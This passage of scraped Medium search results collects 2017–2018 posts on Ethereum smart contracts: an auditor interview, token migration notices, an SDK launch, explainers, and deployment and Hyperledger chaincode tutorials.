2017", "readtime": "3 min read", "upvotes": "620", "content": "Interview with ICO Smart Contract Auditor\u200a\u2014\u200aBok\u00a0KhooDr. Michael J. GarbadeBlockedUnblockFollowFollowingDec 31, 2017When it comes to ICOs, one of the key factors which must be considered is the smart contract. Auditing of a smart contract is an important step in any ICO project as it ensures that the contract is not susceptible to security breaches, among other things. The LiveEdu smart contract was audited by the renowned Bok Khoo aka BokkyPooBah. For the LiveEdu interview series we decided to ask Bok a few questions about smart contract auditing. You can view Bok\u2019s audit of the LiveEdu smart contract here.1.It\u2019s a pleasure to speak with you today Bok. Can you tell us about yourself?Hi. I\u2019m Bok Khoo, or BokkyPooBah, an Ethereum fanatic.2. How long have you been working with the blockchain and ethereum?I heard about Bitcoin when it first came out. I only started getting interested in the trusted platform that blockchain enables in early 2015. There was however, nothing much that could be done on the Bitcoin network except to transfer coins from one account to another.The Ethereum network went live on July 30th 2015. This blockchain is like a giant box of Lego Mindstorm \u2122 for me. New parts are released every few days and there are lots of interesting projects to work on.3. How did you get into smart contract auditing?I helped a colleague develop and check their crowdsale contract. After that, the word spread that I was assisting to secure smart contracts. This led to a stream of smart contract auditing.4. What are the main steps involved when auditing a smart contract?My primary objective when auditing smart contracts (especially crowdsale smart contracts) is to ensure that the contributed ethers (ETH) are not easily stolen or hacked. The easiest way to do this, is for the ETH contributed to the crowdsale contract to be moved immediately into a well-tested multisig wallet. The ETH will sometimes have to accumulate in the crowdsale contract, to support the refund of contributions if the minimum goal is not reached. Special attention must be paid to all the ways that the ETH can leave the crowdsale contract.My secondary objective is to ensure that the crowdsale token contract works as expected. This is not as critical as my primary objective of securing the ETH, as the crowdsale token contract can be redeployed with the token balances copied over. This is easy during the period when the crowdsale closes and the tokens start trading. However, it is still important to get the token contract correct, as these token contracts may live forever on the blockchain.Finally, there is the trust factor of the token contract. Once the crowdsale is completed, token contracts should ideally be unstoppable. The token contract owner should not have the permission to mint new tokens, burn an account\u2019s tokens or suspend transfers.5. What are the biggest ICO smart contracts you\u2019ve audited?I have now worked on, or am working on, 32 crowdsale contracts. I have not kept track of which crowdsale contract raised the largest amounts. More memorable for me is the complexity of the crowdsale contracts. The top of this list comes from Digital Strategies\u2019 Chronologic DAY token contract, followed by their Vyral Network contract (work-in-progress).6. How are you doing the LiveEdu smart contract?I reviewed the smart contract source code and then built some tests around the critical areas of LiveEdu\u2019s smart contract.7. What are the biggest issues you\u2019ve faced so far while auditing the smart contract? What needs to be fixed?There are some recommended actions that can be done to improve LiveEdu\u2019s crowdsale and token smart contract, but these are of low importance. Some of these recommendations relate to changes in the recently finalized ERC20 token standard.8. What do you think about the LiveEdu project? How do you think it will impact the cryptocurrency world?LiveEdu\u2019s use of crypto-tokens as payment for it\u2019s existing service will be another example of how cryptocurrencies can be used to reduce the friction in payments.", "responses": ""}, {"title": "", "author_name": "Aavesome", "link": "https://medium.com/aave/hands-on-session-for-ethlend-community-on-how-to-write-a-smart-contract-with-ethereum-ba768ed5f24?source=search_post", "post_date": "Dec 13, 2017", "readtime": "2 min read", "upvotes": "325", "content": "AavesomeBlockedUnblockFollowFollowingDec 13, 2017Hands-on Session for ETHLend Community on How to write a Smart Contract with EthereumDo you know what Ethereum platform is? Do you know what these Smart Contracts are? Do you know how to write the simple Smart Contracts on Ethereum platform?ETHLend will host a special hands on session for the ETHLend Community to encourage more awareness of smart contracts and spark some enthusiasm into smart contract development!Ethereum is an open-source, public, blockchain-based distributed computing platform featuring smart contract functionality. Ethereum Smart Contracts are written in the Solidify programming language, which has Java and JavaScript like syntax.Smart Contracts are very different from the normal software applications that programmers have been developing till date. One mind boggling aspect of Smart Contract is that, no one can change the code of the Smart Contracts once it is deployed on the Ethereum Blockchain network\u2026.This opens up the thinking like how we will change the code if we had a bug / issue in the logic itself?To know more join our Smart Contract webinar with our Technical Advisor, Jitendra Chittoda to understand the Ethereum and Smart Contracts. Jitendra has been developing and hacking into Smart Contracts more than a year. He is passionate about Blockchain, Ethereum Smart Contracts developments.He will cover following topicsWhat is EthereumWhat is Smart ContractHow many types of accounts are there in EthereumHow Ethereum transactions worksAccess Ethereum Blockchain explorerWrite a simple Smart Contract and interact with itJoin webinar @ on YouTube on 16 December 2017, 15:00 GMT\u200a\u2014\u200a16:30 GMTLink will be posted on our Channel and Telegram!https://www.youtube.com/watch?v=LsE8WuIzKgc", "responses": "2"}, {"title": "New Smart Contract is Complete: MRPH Is\u00a0Here!", "author_name": "Morpheus.Network", "link": "https://medium.com/morpheus-network/new-smart-contract-is-complete-mrph-is-here-4b752c71e386?source=search_post", "post_date": "Jun 29, 2018", "readtime": "2 min read", "upvotes": "535", "content": "New Smart Contract is Complete: MRPH Is\u00a0Here!Morpheus.NetworkBlockedUnblockFollowFollowingJun 29, 2018Hello Community,We are pleased to announce that we have implemented our new smart contract after an extensive security review process. The new token symbol is MRPH. Our new contract address is:https://etherscan.io/address/0x7b0c06043468469967dba22d1af33d77d44056c8We have already started the token swap! We will provide regular updates to the community as the token swap progresses.As is the case for most ERC20 tokens\u200a\u2014\u200ayour new tokens won\u2019t be recognized unless your ERC20 wallet is setup for it. To view your new MRPH tokens, you can use MyEtherWallet.com.On MyEtherWallet.com, click on \u201cView Wallet Info\u201d in the main menu.How would you like to access your wallet? Select, \u201cView w/ Address Only\u201d.Paste your wallet\u2019s public address into the address field and click, \u201cView balance.\u201dIn the Token Balances section, click \u201cAdd Custom Token\u201d.Fill out the token details:Contract Address: 0x7b0c06043468469967dba22d1af33d77d44056c8Token Symbol: MRPHDecimals: 4Click save when ready.A reminder that it is essential for all holders of the old token to fill out this form: https://goo.gl/forms/e5dr9nvztGVmCGXM2We would like to thank all our community members for their patience throughout this process. The support and assistance we\u2019ve received has been instrumental in allowing us to focus on our number one objective right now which is making sure that all those affected by the hack are treated in a fair and equitable manner.It is almost impossible to express just how grateful we are for all the support the community has given us. We do know, however, that the best way to show our appreciation is to do everything in our power to make Morpheus.Network a leader in global trade.We understand how important it is to give you timely information, and we will continue to provide regular updates to our community. Please ensure you are part of the Telegram community to receive updates: https://t.me/themorpheusnetwork", "responses": "3"}, {"title": "Substratum Smart Contract Change\u00a0Coming", "author_name": "Substratum", "link": "https://medium.com/@SubstratumNet/substratum-smart-contract-change-coming-3a00bcb5672a?source=search_post", "post_date": "Jun 9, 2018", "readtime": "", "upvotes": "569", "content": "Substratum Smart Contract Change\u00a0ComingSubstratumBlockedUnblockFollowFollowingJun 9, 2018Substratum Smart Contract Update ComingNext week we will be making some changes to our Smart Contract. It is important to know that this will not affect your trading at all.In our original Whitepaper we specified that if liquidity in the network reached too low we would be able to Mint 10% new supply for our token using the method mintToken() within the Smart Contract. This method can ONLY be called by the originator wallet and has NEVER been called. Throughout product development we have decided that we will not need this function and have been meaning to remove it for a while to provide our users with a greater sense of security that their token will always maintain its value by never becoming diluted.The benefits of this to token holders is that there can NEVER be an increase in the number of Substratum tokens so the TOTAL SUPPLY will only ever ben 472 million. That\u2019s 592M minus the 120M we have already burned.Additionally there is a function called setPrices() that was only used in TESTING the Smart Contract but has never been used in PRODUCTION.We are working with Binance who has confirmed that we have never called these functions but it is mutually agreed to be in the best interest of the community to remove both of them so that will take place next week, the week of June 11th. There will be no trading activity downtime through this upgrade.", "responses": "3"}, {"title": "Smartcontract updates & upcoming\u00a0features", "author_name": "Etheremon", "link": "https://medium.com/@myetheremon/smartcontract-updates-upcoming-feature-7a83b1b8b1a0?source=search_post", "post_date": "Dec 23, 2017", "readtime": "2 min read", "upvotes": "333", "content": "Smartcontract updates & upcoming\u00a0featuresEtheremonBlockedUnblockFollowFollowingDec 23, 2017We have two smart contracts right now: one holding data (EtheremonData Contract), one holding interaction functions (EtheremonProcessor Contract).There are two problems with those contracts:EtheremonData Contract: provides a few sensitive functions which allows admin to modify users monster.EtheremonProcessor Contract: withdraw function does not have limit, this allows admin to withdraw users fund.In the next updates, both problems will be solved by a new set of smart contracts. The source codes are uploaded to github for auditing and reviewing, you can find them here.EtheremonData contains user\u2019s data, so we will not replace it. To prevent admin to use sensitive functions, we will transfer owner to address 0x0. Hence, no one can use those functions.EtheremonProcessor will be replaced with EtheremonWorld, the updated version of withdraw function only allows admin to withdraw his ETH.Three contracts EtheremonWorld, EtheremonTrade, EtheremonTransform are only 3moderators of EtheremonData, they can not be updated in the future and they are only 3 addresses can use write-function of EtheremonData.EtheremonBattle and EtheremonTransformProcessor are updatable and they are not moderators of EtheremonData.Features in this updates:Trading, Lending, Borrowing EtheremonsDetails for releasing those smart contracts on main net will be updated in a later blog. Please help to review our smart contracts. A bounty in Ether will be rewarded for bug finders and significant contributors.", "responses": "3"}, {"title": "Sagewise Announces Alpha Release of Ethereum Smart Contract SDK To Combat the More than Half a Billion Dollars Lost in Smart Contracts in\u00a02017", "author_name": "Amy Wan", "link": "https://medium.com/sagewise/sagewise-announces-alpha-release-of-ethereum-smart-contract-sdk-to-combat-the-more-than-half-a-cab11a782915?source=search_post", "post_date": "Apr 3, 2018", "readtime": "3 min read", "upvotes": "361", "content": "Sagewise Announces Alpha Release of Ethereum Smart Contract SDK To Combat the More than Half a Billion Dollars Lost in Smart Contracts in\u00a02017Amy WanBlockedUnblockFollowFollowingApr 3, 2018Sagewise conducts public alpha launch of Ethereum Smart Contract SDK to freeze Ethereum smart contracts.Today, we are proud to announce the alpha release of the Sagewise smart contract SDK. Built on the Ethereum blockchain, the SDK is a core component of Sagewise\u2019s toolkit for unforeseen errors and disputes in smart contracts and marks a key milestone in its overall development. Before getting into the details of today\u2019s launch, let me start with a little background on what we hope to accomplish at Sagewise.Modern day smart contracts started with the launch of Ethereum in 2015 and, in a lot of ways, represented the dawn of fully programmable money. From the outset, one of the biggest concerns of the community was that combining human-created code with instant money transfer could frequently and unexpectedly result in the loss of user funds. Because less than one percent of the earth\u2019s population can program or read code, cryptocurrency-related transactions\u200a\u2014\u200aincluding smart contracts do not represent an area where we can reasonably tell a person to \u201cDYOR\u201d (do your own research), as often stated in the cryptocurrency community. Instead, smart contracts represent something very similar to traditional paper contracts in that they cannot be adequately understood or audited by ordinary people.While anyone can attempt to read a contract, if they lack a background in programming or law, respectively, it is highly unlikely they will be able to catch all the nuances and find all the holes. As an example, someone with no programming background cannot be expected to be aware of all the possible obfuscated bugs that may exist in a smart contract.Which is where we find ourselves today. More than a half a billion dollars was lost to smart contract coding bugs in 2017. The initial fears and predictions are now reality, and it\u2019s time to figure out how to fix it. Many people are working on this issue through two different approaches:Making smart contract code better through better coding, tools, and auditsResolving issues that arise through mediation and dispute resolutionAt Sagewise, we are focused on the latter. We are bringing transactional confidence to smart contracts by building infrastructure that acts as a safety net for unforeseen circumstances, whether that be coding errors, security vulnerabilities, changes in circumstances, or disputes. We chose to focus on this because not all issues related to smart contracts can be foreseen\u200a\u2014\u200aeven with the most careful, thoughtful coding. Smart contracts can get bad data from an oracle, or a situation can occur that was never considered. While code is static, human situations are not\u200a\u2014\u200awe live in a world where volcanoes can halt air travel, strikes can delay commerce, and seemingly unlikely human actions can result in situations no one thought possible. Code cannot be aware of every future possibility. The question is, how do you put a safety net around a smart contract without completely damaging immutability and decentralization?Our release today provides a peek at our approach and can be summarized by the following features:All functions in the contract can be frozen;Contracting parties do not have any special control aside from the ability to start a dispute, which freezes execution of the smart contract;Dispute resolution vendors are given complete access to the contract via \u2018Administrator Mode\u2019, but this only is available when a dispute has been initiated by one of the contracting parties. This allows contracting parties to fix any issues that may have occurred.In coming months, we plan to add several more features to the SDK to improve its robustness and usability. Alongside the Sagewise ContractCanary\u200a\u2014\u200aa smart contract email monitoring and notification system available to licensees\u200a\u2014\u200athe Sagewise SDK prevents unforeseen execution of a smart contract. Sagewise also plans to release other support tools as part of its infrastructure that will help bring the entire transactional process together, from documentation of smart contract intent to dispute resolution process handling.We welcome feedback and engagement by community members, who can sign up for updates at sagewise.io and engage via our Telegram channel at t.me/sagewise.Our alpha SDK repository can be found here.", "responses": "1"}, {"title": "Blockchain Technology Part 2\u00a0: Smart Contract Fundamentals", "author_name": "Pramod Chandrayan", "link": "https://codeburst.io/blockchain-technology-part-2-smart-contract-fundamentals-d243e2311f94?source=search_post", "post_date": "Aug 30, 2017", "readtime": "4 min read", "upvotes": "408", "content": "Blockchain Technology Part 2\u00a0: Smart Contract FundamentalsPramod ChandrayanBlockedUnblockFollowFollowingAug 30, 2017Img Source\u00a0: Draglet.comIn my previous article Blockchain Technology Part 1\u00a0: What and Why\u00a0? we learned the basics of Blockchain technology and it\u2019s\u00a0utility.\u201cThe blockchain is an incorruptible digital ledger of economic transactions that can be programmed to record not just financial transactions but virtually everything of value.\u201d -Don &\u00a0AlexLearn basics of Machine\u00a0LearningIn continuation today we will understand blockchain implementation as Smart contracting and basics of ethereum as smart contracting mechanismSmart contract\u00a0:\u201cSmart contracts are computer protocols intended to facilitate, verify, or enforce the negotiation or performance of a contract\u201dImage Credit\u00a0:\u00a0ItwebSmart contracts were first proposed by Nick Szabo in 1996. Nick Szabo, realised that the decentralised ledger could be used for smart contracts, otherwise called self-executing contracts, blockchain contracts, or digital contracts. In this format, contracts could be converted to computer code, stored and replicated on the system and supervised by the network of computers that run the blockchain.Smart contracts have been used primarily in association with cryptocurrencies. The most prominent smart contract implementation is the Ethereum blockchain platform, which also calls them decentralised applications or dapps.Smart Contract Implementations\u00a0:Some of the popular mechanism for smart contract implementations areEthereum is an open-source, public, blockchain-based distributed computing platform featuring smart contract (scripting) functionality. EVM (Ethereum Virtual Machine) is decentralised turing virtual machine which operates through international network of public Nodes. Ethereum as a concept was first pr0posed by renowned cryptocurrency researcher Vitalik Buterin in 2013. In Ethereum, smart contracts are treated as autonomous scripts or stateful decentralised applications that are stored in the Ethereum blockchain for later execution by the EVM.Namecoin(N)\u00a0:is a cryptocurrency and the first fork of the bitcoin software.It is based on the code of bitcoin and uses the same proof-of-work algorithm. It is limited to 21 million coins. Unlike bitcoin, Namecoin can store data within its own blockchain transaction database. Namecoin\u2019s flagship use case is the censorship-resistant top level domain\u00a0.bit, which is functionally similar to\u00a0.com or\u00a0.net domains but is independent of ICANN, the main governing body for domain names.3. Ripple (Codius)\u00a0: It\u2019s a smart oracle which uses Google Native Client for code sanboxing. When two people transact, they could write the terms of their transactions into code, but neither of them might trust the other to run it.Codius allows a third party to run it and attest to the integrity of the exact code it received. Unfortunately this mode of smart contract has discontinued and is no more being used in practise,Ripple Labs, maintainer of the digital currency Ripple, has announced it will not continue the development of its smart contract project nearly a year after it was announced, saying the \u201csmall and nascent decentralization market\u201d is too immature.4. Automated Transactions\u00a0: is another turing complete smart contract language, used in cryptocurrencies like Burstcoin and Qora.Process Involved In Smart Contract\u00a0: When we execute transaction as smart contract between 2 nodes as peer to peer network, there are 3 general steps involved.Translating the terms of the contract into code. Since digital systems are deterministic, all possible outcomes of a contract, including penalties for breach of contract and referral to a (non-deterministic) arbitrator, are specified explicitly.2. Agreeing on the precise code that will be run. In practice, parties would usually build their contract from widely used configurable contract\u00a0modules. Once the contract is agreed upon, it is very important to ensure that the same code actually ends up being executed. See sections\u00a0Deterministic Compilation\u00a0and\u00a0Unique Secret and Key Pair.3. Executing the code in a trustworthy manner. The code must be run by an impartial third party or by a group of independent entities that are highly unlikely to collude. Smart contracts can also be used without ever actually executing the code; see the section on\u00a0Offline Contracts\u00a0for more details on this use case.Ultimately the benefits of using smart contracts instead of traditional contracts come from the increased speed, efficiency, and trust that the contract will be executed exactly as agreed.Practical Examples of Smart ContractIn the series of Blockchain Technology next i will elaborate more on practical Implementation of Smart Contract and it\u2019s programmatic ImplementationTo Be Continued\u2026..", "responses": ""}, {"title": "Smart Contract Protocols\u200a\u2014\u200aPart\u00a0I", "author_name": "Ash Egan", "link": "https://medium.com/@Ashaegan/smart-contract-protocols-part-i-6ada9ca4964c?source=search_post", "post_date": "Sep 12, 2018", "readtime": "2 min read", "upvotes": "210", "content": "Smart Contract Protocols\u200a\u2014\u200aPart\u00a0IAsh EganBlockedUnblockFollowFollowingSep 12, 2018As crypto slowly evolves from investment phase to utility phase, we are on the brink of a paradigm shift within software development and distribution. We are seeing a massive talent spillover from web2 to a decentralized web or web3, and the materialization of a new and open financial system.Three years after Ethereum\u2019s 2015 mainnet launch, the utility phase is beginning to emerge, exampled by thousands of dapps, millions of blockchain wallets, and a global movement of entrepreneurs building towards web3. As of today, Ethereum is the clear market leader for \u201cdecentralized\u201d app creation. However hurdles such as Ethereum scalability, transactions costs, and delayed upgrades mean shifting sands for application-focused developers.To make the \u2018utility phase\u2019 a reality, we must understand the state of smart contract protocols, where the activity is happening, and how developers can choose where to build. The more I speak to web3 entrepreneurs, the more I realize the limited or incorrect information there is on smart contract protocols\u2026so, I decided in early-August to embark on a research journey of alternative smart contract protocols \u2014which meant reading dozens of smart contract whitepapers.I will be open-sourcing my research in the coming weeks and months, and launching the initiative in this post.Part I: All the WhitepapersHigh-level InsightsI included a total of 60 smart contract protocols whitepapers, although read dozens more which did not fulfill defined criteria. Of these 60\u202630 (50%) are currently traded on exchanges.6 (10%) raised funds using ERC20 smart contract.The top 3 keywords in Whitepaper Titles were \u201cblockchain\u201d (13), \u201cdecentralized\u201d (7), and \u201cdistributed\u201d (6).For whitepaper releases, 2017 was the leader with 18, while 2018 was close behind with 13. To note, 17 were undated.", "responses": ""}, {"title": "All Systems Go! Qravity Smart Contracts Pass RIAT\u00a0Audit", "author_name": "Qravity Com", "link": "https://medium.com/qravity/all-systems-go-qravity-smart-contracts-pass-riat-audit-1e1847978104?source=search_post", "post_date": "Aug 17, 2018", "readtime": "3 min read", "upvotes": "962", "content": "All Systems Go! Qravity Smart Contracts Pass RIAT\u00a0AuditQravity ComBlockedUnblockFollowFollowingAug 17, 2018Ralph Pichler of RIAT\u200a\u2014\u200aInstitute for Future Cryptoeconomics audited smart contract implementation into the Qravity token sale. To view his report, visit QravityQCOGmbH/smartcontracts on GitHub.In this article, we will go over the importance of smart contract audits, and why we wanted one done for Qravity.A smart contract is a computerized transaction protocol containing code and agreements that exist across a distributed, decentralized blockchain network. In simple terms, it\u2019s a digitized version of a real-life contract that allows parties to transact directly with each other, eliminating the need for intermediaries.Impartial and immutable, a smart contract contains a set of conditions that all contractual parties must meet for it to come into effect. This makes for a secure, fault-proof way of executing monetary transactions and business operations. A smart contract is rendered invalid if any of the contractual parties do not meet its conditions.Smart contracts for the Qravity token sale comply with the ERC-20 standard. This means Qravity QCO follow best practices for creating token contracts on the Ethereum blockchain. The ERC-20 standard provides a stable and trusted architecture for smart contract development that can be implemented in operations with native currencies that work with decentralized applications, the creation of voting systems, collateral deals, staking platforms, and financial systems. You can learn more about the technical specifications of the ERC-20 token standard in eminent investment advisor Jim McDonald\u2019s insightful article Understanding ERC-20 token contracts. For specifics about the smart contracts developed for the Qravity token sale, read our white paper, which provides an extensive explanation of the technology.Though their benefits are clear, smart contracts come with a catch: due to their immutability, they cannot be modified once their code has been deployed to a blockchain. Because people code smart contracts, and because people make mistakes, a smart contract audit is a vital step that must be taken before deployment. The dire consequences of not taking this step include security breaches, identity theft, and financial losses.A smart contract audit is basically a quality assurance check-up that focuses on the vulnerabilities of smart contract technology. To ensure an impartial review, companies usually employ a third-party auditor that examines code thoroughly to make sure it has been implemented correctly.For a detailed overview of the smart contract audit process, read blockchain expert Aran Davies\u2019 article How to Audit a Smart Contract?\u200a\u2014\u200aA Guide.We had Ralph Pichler audit the smart contract code for the Qravity token sale because he is an experienced professional in the fields of cryptoeconomics and blockchain. At RIAT, he oversees everything related to Ethereum and Solidity, and is responsible for the Ethereum Academy.Ralph audited all the components of the QCO token contract in the context of QCO only, not as standalone applications. He focused solely on scenarios that were most likely to occur, and did not include unlikely vulnerabilities.Ralph audited the code manually multiple times, paying special attention to:Non-zero gas calls to untrusted tokensUnchecked overflowContracts getting stuck because of checked overflowUnaccounted paymentsBoundaries of maximum gas consumption of FOR loopsWays for attackers to block code executionIn addition to inspecting Qravity smart contract code manually, Ralph passed it through several automated security tools, such as Securify, Mythril, and Oyente. Ralph and his team manually reviewed the issues these tools found, even though most of them turned out to be false positives.If you have any questions regarding the smart contract technology implemented in the Qravity token sale, please don\u2019t hesitate to contact us at office@qravity.com.The Qravity token presale blasts off tomorrow! Don\u2019t miss your chance to get 30% bonus QCO from August 18 to 31, 2018. Visit www.qravity.com to sign up.", "responses": "6"}, {"title": "Build your first Ethereum smart contract during lunch\u00a0break", "author_name": "Jeff Hu", "link": "https://medium.com/taipei-ethereum-meetup/build-your-first-ethereum-smart-contract-during-lunch-break-89b2a5a952d2?source=search_post", "post_date": "Aug 6, 2017", "readtime": "5 min read", "upvotes": "327", "content": "Build your first Ethereum smart contract during lunch\u00a0breakJeff HuBlockedUnblockFollowFollowingAug 6, 2017This tutorial promised to guide you through your first smart contract in 25 minutes. Sit tight and let\u2019s begin.Lunch break plays a crucial role in the daily life of many of us, so as Blockchain and the Bitcoin, who went viral on the globe in recent years. You could nearly tell the movement of Bitcoin price, by the peculiar look gave from the person you bumped into on street. Not long ago, the emergence of Ethereum brought the preciosity of blockchain technology back to community. Each of us, you and me, now have the pen to sign off a contract.3 steps in\u00a0totalGet what you needSwift guide through the codeDeploy and try it out", "responses": "1"}, {"title": "How to Deploy a Smart Contract to\u00a0GoChain", "author_name": "GoChainGo", "link": "https://medium.com/gochain/how-to-deploy-a-smart-contract-to-gochain-40de78d4d85a?source=search_post", "post_date": "Jun 21, 2018", "readtime": "3 min read", "upvotes": "844", "content": "How to Deploy a Smart Contract to\u00a0GoChainGoChainGoBlockedUnblockFollowFollowingJun 21, 2018Update: See this newer article for an easier way to deployA lot of people ask \u201cHow do I deploy my Ethereum smart contract to GoChain?\u201d and the answer is: \u201cthe same way you deploy to Ethereum, just point to a different network\u201d. But to make that clear and show how simple it is, here\u2019s a quick guide for deploying contracts to GoChain.Step 1: Compile your\u00a0ContractWe\u2019ll use the simple hello world contract from here (slightly upgraded for newer Solidity):All this contract does is return \u201cHello World!\u201d when you call the greet() function. It also has a self destruct in case you want to destroy the contract later and return any ETH that was mistakenly sent to it.To compile it, go to Remix, paste the above into the editor then click \u201cStart to compile\u201d.Then you should see the following right below that:Click \u201cDetails\u201d. In the WEB3DEPLOY section, copy the \u201cdata\u201d field, that\u2019s your compiled contract.Step 2: Deploy your\u00a0ContractWe\u2019re going to deploy through MyEtherWallet since it\u2019s easy to do and you don\u2019t need to install any tools or anything.First thing you need to do is add GoChain (start with the GoChain TestNet) to the Network list on MyEtherWallet as it explains in this Guide.Once you\u2019ve added GoChain to MEW, go to the Contracts section, then click Deploy Contract. Paste the \u201cdata\u201d field you copied from Remix into the \u201cByte Code\u201d textbox. Choose Private Key and enter your GoChain TestNet private key (if you need some testnet Go, ask in our testnet Telegram), then click Unlock.Now click Sign Transaction. Now be ready to copy and paste the contract address, for some reason MEW only shows it for about 5 seconds and it\u2019s hard to find if you don\u2019t grab it! Now click Deploy Contract and snag the contact address quickly.Yay, your contract is deployed!Step 3: Using the\u00a0ContractAlright, so now you\u2019ve deployed your contract, time to use it! In MEW, go to the contracts section again and Interact with Contract should be selected. Paste your contract address you got from step 2 into the first field.Now back in Remix, copy the ABI details by clicking the clipboard beside where it says ABI like so:Now go paste that into the ABI / JSON Interface field in MEW then click Access. Now select the greet function in the select box and you should see the Hello World! response from the contract you just deployed.That\u2019s it! You just deployed your first contract to GoChain and interacted with it.Next StepsThe same concepts we followed here will apply to whatever tool you are using. For example, if you are using Truffle Framework, add GoChain\u2019s RPC URL to your Truffle network configuration.", "responses": ""}, {"title": "Deploy Smart Contracts on Ropsten Testnet through Ethereum\u00a0Remix", "author_name": "Moses Sam Paul", "link": "https://medium.com/swlh/deploy-smart-contracts-on-ropsten-testnet-through-ethereum-remix-233cd1494b4b?source=search_post", "post_date": "Mar 16, 2018", "readtime": "4 min read", "upvotes": "451", "content": "Deploy Smart Contracts on Ropsten Testnet through Ethereum\u00a0RemixMoses Sam PaulBlockedUnblockFollowFollowingMar 16, 2018Step-by-step guide to deploy your smart contract from the local blockchain\u200a\u2014\u200aGanache to Ropsten Test Net using the browser based IDE\u200a\u2014\u200aRemixContext:If you have read this tutorial you would know that the we used a local blockchain network called Ganache and used the truffle framework to deploy the smart contracts within a local test environment. This tutorial is the next step in understanding the different ets environments available to us. This post will guide you to deploy the same on ethereum remix IDE (IDE\u200a\u2014\u200aIntegrated Development Environment) on the Ropsten test net.", "responses": "2"}, {"title": "\u0e2a\u0e23\u0e49\u0e32\u0e07 Blockchain \u0e14\u0e49\u0e27\u0e22 Hyperledger\u00a0: #5 \u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e2b\u0e23\u0e37\u0e2d Chaincode \u0e14\u0e49\u0e27\u0e22\u0e20\u0e32\u0e29\u0e32\u00a0Go", "author_name": "Methus Kaewsaikao", "link": "https://medium.com/cochain/%E0%B8%AA%E0%B8%A3%E0%B9%89%E0%B8%B2%E0%B8%87-blockchain-%E0%B8%94%E0%B9%89%E0%B8%A7%E0%B8%A2-hyperledger-5-%E0%B8%81%E0%B8%B2%E0%B8%A3%E0%B9%80%E0%B8%82%E0%B8%B5%E0%B8%A2%E0%B8%99-smart-contract-%E0%B8%AB%E0%B8%A3%E0%B8%B7%E0%B8%AD-chaincode-%E0%B8%94%E0%B9%89%E0%B8%A7%E0%B8%A2%E0%B8%A0%E0%B8%B2%E0%B8%A9%E0%B8%B2-go-5cb53b8add0a?source=search_post", "post_date": "Jan 17, 2018", "readtime": "5 min read", "upvotes": "70", "content": "\u0e2a\u0e23\u0e49\u0e32\u0e07 Blockchain \u0e14\u0e49\u0e27\u0e22 Hyperledger\u00a0: #5 \u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Smart Contract \u0e2b\u0e23\u0e37\u0e2d Chaincode \u0e14\u0e49\u0e27\u0e22\u0e20\u0e32\u0e29\u0e32\u00a0GoMethus KaewsaikaoBlockedUnblockFollowFollowingJan 17, 2018\u0e2b\u0e25\u0e32\u0e22 \u0e46 \u0e04\u0e19\u0e17\u0e35\u0e48\u0e23\u0e39\u0e49\u0e08\u0e31\u0e01 Blockchain \u0e04\u0e07\u0e08\u0e30\u0e23\u0e39\u0e49\u0e08\u0e31\u0e01\u0e01\u0e31\u0e1a Smart Contract \u0e01\u0e31\u0e19\u0e21\u0e32\u0e1a\u0e49\u0e32\u0e07\u0e41\u0e25\u0e49\u0e27 \u0e43\u0e19 Hyperledger Fabric \u0e08\u0e30\u0e40\u0e23\u0e35\u0e22\u0e01 Smart Contract \u0e27\u0e48\u0e32 Chaincode \u0e04\u0e23\u0e31\u0e1a\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Chaincode \u0e19\u0e31\u0e49\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e40\u0e02\u0e35\u0e22\u0e19\u0e40\u0e21\u0e18\u0e2d\u0e14\u0e2b\u0e25\u0e31\u0e01 \u0e46 \u0e2d\u0e22\u0e39\u0e48 2 \u0e15\u0e31\u0e27\u0e04\u0e37\u0e2d Init \u0e41\u0e25\u0e30 Invoke \u0e0b\u0e36\u0e48\u0e07Init \u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e23\u0e34\u0e48\u0e21\u0e15\u0e49\u0e19\u0e2b\u0e23\u0e37\u0e2d\u0e2d\u0e31\u0e1e\u0e40\u0e01\u0e23\u0e14 Chaincode \u0e17\u0e35\u0e48\u0e40\u0e23\u0e32 Install \u0e44\u0e1bInvoke \u0e08\u0e30\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e17\u0e33 Transaction \u0e1a\u0e19 Blockchain \u0e40\u0e0a\u0e48\u0e19 \u0e40\u0e0b\u0e15\u0e04\u0e48\u0e32\u0e2b\u0e23\u0e37\u0e2d\u0e23\u0e31\u0e1a\u0e04\u0e48\u0e32\u0e40\u0e23\u0e34\u0e48\u0e21\u0e15\u0e49\u0e19\u0e01\u0e48\u0e2d\u0e19\u0e2d\u0e37\u0e48\u0e19\u0e40\u0e23\u0e32\u0e08\u0e30\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e44\u0e1f\u0e25\u0e4c Chaincode \u0e02\u0e2d\u0e07\u0e40\u0e23\u0e32\u0e43\u0e19 GOPATH \u0e01\u0e31\u0e19\u0e01\u0e48\u0e2d\u0e19mkdir $GOPATH/src/sacccd $GOPATH/src/sacctouch sacc.go\u0e42\u0e14\u0e22 sacc \u0e22\u0e48\u0e2d\u0e21\u0e32\u0e08\u0e32\u0e01 Simple Asset Chaincode \u0e08\u0e32\u0e01\u0e19\u0e31\u0e49\u0e19\u0e41\u0e01\u0e49\u0e44\u0e1f\u0e25\u0e4c sacc.gopackage mainimport ( \u201cfmt\u201d \u201cgithub.com/hyperledger/fabric/core/chaincode/shim\u201d \u201cgithub.com/hyperledger/fabric/protos/peer\u201d)type SimpleAsset struct {}\u0e08\u0e30\u0e40\u0e2b\u0e47\u0e19\u0e27\u0e48\u0e32\u0e40\u0e23\u0e32 import library \u0e02\u0e2d\u0e07 Hyperledger Fabric \u0e21\u0e32 2 \u0e15\u0e31\u0e27\u0e04\u0e37\u0e2dcore/chaincode/shimprotos/peer\u0e40\u0e02\u0e35\u0e22\u0e19 Init\u0e04\u0e23\u0e32\u0e27\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e23\u0e34\u0e48\u0e21\u0e40\u0e02\u0e35\u0e22\u0e19 Init 